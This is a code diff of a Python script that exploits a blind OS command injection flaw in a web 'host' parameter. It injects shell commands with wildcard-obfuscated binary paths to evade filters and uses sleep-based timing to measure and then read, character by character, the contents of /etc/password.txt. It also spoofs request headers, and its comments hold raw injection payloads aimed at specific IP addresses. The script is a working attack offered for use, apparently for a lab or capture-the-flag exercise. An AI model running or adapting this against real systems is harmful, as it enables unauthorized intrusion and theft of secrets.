@@ -4,6 +4,9 @@ import requests
 import argparse
 from os import sys
 from typing import Dict
+from urllib3.util import SKIP_HEADER
+from collections import OrderedDict
+from copy import deepcopy
 
 def parse_args():
     
@@ -23,8 +26,23 @@ def parse_args():
 def make_get_request(url:str, 
                      timeout=10):
     ret_val:bool = False
+    
     try:
-        response:requests.Response = requests.get(url=url, timeout=timeout)
+        # reset default headers
+        headers = OrderedDict({
+            "Host": SKIP_HEADER,
+            "User-Agent": SKIP_HEADER,
+            "Accept-Encoding": SKIP_HEADER,
+        })
+
+        # add the desired headers here in order, duplicate keys are not possible
+        headers.update(OrderedDict([
+            ("Host", "injection.com"),
+            ("Accept", "*/*"),
+            ("User-Agent", "Should come last"),
+        ]))
+
+        response:requests.Response = requests.get(url=url, timeout=timeout, headers=headers)
         if response.status_code != 200:
             print(response.status_code)
             return False
@@ -36,20 +54,15 @@ def make_get_request(url:str,
 
 def determine_password_length(url:str, timeout=10):
     
-    data = {}
     sleep:int = timeout + 1
-    for i in range(0,100):
-        
-        
-        
+    for i in range(0, 100):
+        # COMMAND '/u?r/b?n/ca? /etc/password.txt | wc -c | { read l; [ $l -eq '+str(i)+' ] && /u?r/b?n/sl??p '+str(sleep)+'; }'
+        full_url = deepcopy(url) + "?host=127.0.0.1%3B+%2Fu%3Fr%2Fb%3Fn%2Fca%3F+%2Fetc%2Fpassword.txt+|+wc+-c+|+{+read+l%3B+[+%24l+-eq+"+str(i)+"+]+%26%26+%2Fu%3Fr%2Fb%3Fn%2Fsl%3F%3Fp+"+str(sleep)+"%3B+}"
         print(f"Attempting password length: {i}")
-        if make_get_request(url, timeout):
+        if make_get_request(full_url, timeout):
             print(f"PASSWORD LENGTH FOUND!! ({i})")
             return i
-
     return -1
-
-
 
 def determine_password_request(url:str, 
                                timeout:int,
@@ -57,10 +70,11 @@ def determine_password_request(url:str,
                                char_code:int, 
                                sleep:int,
                                operator:str):    
-    url = url + '?host=127.0.0.1; /u?r/b?n/t?il -c +'+str(len)+' /etc/password.txt | /u?r/b?n/h?ad -c 1 | { read v; [[ "$v" == "'+chr(char_code)+'" ]] && /u?r/b?n/sl??p '+str(sleep)+' || /u?r/b?n/?s; }'
-    print(f"Attempting to see if ascii-code={char_code} is '{operator}' than the unknown character at position {len} : url={url}")
+    #COMMAND '/u?r/b?n/t?il -c +'+str(len)+' /etc/password.txt | /u?r/b?n/h?ad -c 1 | { read v; [[ "$v" == "'+chr(char_code)+'" ]] && /u?r/b?n/sl??p '+str(sleep)+'; }'
+    url = deepcopy(url) + '?host=127.0.0.1%3B+%2Fu%3Fr%2Fb%3Fn%2Ft%3Fil+-c+%2B'+str(len)+'+%2Fetc%2Fpassword.txt+|+%2Fu%3Fr%2Fb%3Fn%2Fh%3Fad+-c+1+|+{+read+v%3B+[[+"%24v"+%3D%3D+"'+chr(char_code)+'"+]]+%26%26+%2Fu%3Fr%2Fb%3Fn%2Fsl%3F%3Fp+'+str(sleep)+'%3B+}'
+    
+    print(f"Attempting to see if ascii-code={char_code} is '{operator}' than the unknown character at position {len}")
     return make_get_request(url, timeout)
-
 
 
 def linear_search_determine_password(url:str, password_len:int, timeout=10):
@@ -73,6 +87,7 @@ def linear_search_determine_password(url:str, password_len:int, timeout=10):
                 password += chr(char_code)
                 print("PASSWORD: " + password)
                 break
+        return "NOT FOUND"
     return password
 
 
@@ -129,7 +144,10 @@ def binary_search_determine_password(url:str, password_len:int, timeout:int=10):
 
 
 url:str = parse_args()
-linear_search_determine_password(url, 10, 10)
+timeout = 5
+password = linear_search_determine_password(url, determine_password_length(url, timeout), timeout)
+
+print(f"PASSWORD FOUND: {password}")
 
 # 127.0.0.1; /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "@" ] && /u?r/b?n/sl??p 11 || /u?r/b?n/?s; }
 # 192.168.1.153; /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "a" ] && /u?r/b?n/sl??p 11 || /u?r/b?n/?s; }
